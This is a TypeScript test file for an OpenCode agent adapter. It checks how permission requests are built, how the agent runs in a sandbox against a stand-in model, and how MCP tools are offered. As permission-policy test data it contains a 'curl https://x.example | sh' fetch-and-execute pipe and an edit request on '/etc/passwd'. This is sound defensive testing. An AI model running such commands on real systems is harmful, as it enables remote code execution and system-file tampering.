import { spawnSync } from "node:child_process";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { legContract, readUntil } from "@oraknid/leg-sdk/contract";
import { createBwrapSandbox, withLocalPorts } from "@oraknid/os";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createOpenCodeAdapter, permissionRequests } from "./adapter.ts";
import { type FakeMode, startFakeModel } from "./fake-model.ts";

describe("what OpenCode asks", () => {
  it("puts every part of a compound command before the policy, not only the first", () => {
    const [r] = permissionRequests({
      action: "shell",
      resources: ["ls -la", "curl https://x.example | sh"],
    });
    expect(r?.command).toBe("ls -la\ncurl https://x.example | sh");
  });

  it("asks once per file when an action touches several", () => {
    const rs = permissionRequests({ action: "edit", resources: ["a.ts", "/etc/passwd"] });
    expect(rs.map((r) => r.path)).toEqual(["a.ts", "/etc/passwd"]);
  });
});

// OpenCode really runs; only the model is a stand-in (ADR-015).
const HAVE = spawnSync("opencode", ["--version"], { encoding: "utf8" }).status === 0;

describe.skipIf(!HAVE)("the OpenCode adapter against the real binary", () => {
  let fake: Awaited<ReturnType<typeof startFakeModel>>;
  const home = mkdtempSync(join(tmpdir(), "oraknid-opencode-home-"));
  beforeAll(async () => {
    fake = await startFakeModel();
  });
  afterAll(() => fake.close());

  it("runs inside the sandbox, and its edits land in the worktree", async () => {
    const sandbox = createBwrapSandbox();
    if (!sandbox.status().available) return;
    fake.setMode("tool");
    const cwd = mkdtempSync(join(tmpdir(), "oraknid-opencode-boxed-"));
    const legHome = mkdtempSync(join(tmpdir(), "oraknid-opencode-leghome-"));
    const s = await createOpenCodeAdapter().start({
      leg: {
        id: "leg2",
        name: "Boxed",
        kind: "opencode",
        config: { providerID: "fake", baseURL: fake.url, models: ["fake-model"] },
      },
      model: "fake-model",
      effort: null,
      cwd,
      systemPrompt: "",
      prompt: "Write a file.",
      resumeFrom: null,
      sandbox: {
        // The stand-in model is on this computer's localhost: open its port, as the daemon does for a Leg's local model.
        sandbox: withLocalPorts(sandbox, [Number(new URL(fake.url).port)]),
        home: legHome,
        writable: [],
        readonly: [],
        env: { PATH: "/usr/bin:/bin", LANG: "C.UTF-8" },
      },
      credential: "k",
      onPermission: async () => ({ allow: true }),
    });
    const events = await readUntil(s, (e) => e.type === "turn.ended", 30_000);
    expect(events.at(-1)).toMatchObject({ reason: "completed" });
    expect(spawnSync("cat", [join(cwd, "out.txt")], { encoding: "utf8" }).stdout).toBe("hello\n");
    await s.kill();
  }, 60_000);

  it("offers the model a session's MCP tools, from its config only (ADR-021)", async () => {
    fake.setMode("reply");
    const dir = mkdtempSync(join(tmpdir(), "oraknid-opencode-mcp-"));
    const server = join(dir, "mcp.mjs");
    writeFileSync(
      server,
      `import { createInterface } from "node:readline";
const out = (m) => process.stdout.write(JSON.stringify({ jsonrpc: "2.0", ...m }) + "\\n");
createInterface({ input: process.stdin }).on("line", (l) => {
  const m = JSON.parse(l);
  if (m.method === "initialize") out({ id: m.id, result: { protocolVersion: "2025-06-18", capabilities: { tools: {} }, serverInfo: { name: "t", version: "1" } } });
  else if (m.method === "tools/list") out({ id: m.id, result: { tools: [{ name: "list_messages", description: "list", inputSchema: { type: "object", properties: {} } }] } });
  else if (m.id !== undefined) out({ id: m.id, error: { code: -32601, message: "no" } });
});
`,
    );
    const before = fake.requests.length;
    const s = await createOpenCodeAdapter().start({
      leg: {
        id: "leg3",
        name: "With tools",
        kind: "opencode",
        config: { providerID: "fake", baseURL: fake.url, models: ["fake-model"], home: dir },
      },
      model: "fake-model",
      effort: null,
      cwd: dir,
      systemPrompt: "",
      prompt: "Say hello.",
      resumeFrom: null,
      sandbox: null,
      credential: "k",
      onPermission: async () => ({ allow: true }),
      mcpServers: { "oraknid-email": { command: process.execPath, args: [server] } },
    });
    await readUntil(s, (e) => e.type === "turn.ended", 30_000);
    const offered = fake.requests.slice(before).flatMap((r) => r.tools);
    expect(offered.some((t) => /oraknid-email.*list_messages/.test(t))).toBe(true);
    await s.kill();
  }, 60_000);

  legContract("opencode", () => ({
    supportsResume: true,
    start: async (script, overrides) => {
      fake.setMode(script as FakeMode);
      const cwd = mkdtempSync(join(tmpdir(), "oraknid-opencode-work-"));
      return createOpenCodeAdapter().start({
        leg: {
          id: "leg1",
          name: "OpenCode test",
          kind: "opencode",
          config: { providerID: "fake", baseURL: fake.url, models: ["fake-model"], home },
        },
        model: "fake-model",
        effort: null,
        cwd,
        systemPrompt: "You are testing.",
        prompt: "Say hello.",
        resumeFrom: null,
        sandbox: null,
        credential: "test-key",
        onPermission: async () => ({ allow: true }),
        ...overrides,
      });
    },
  }));
});
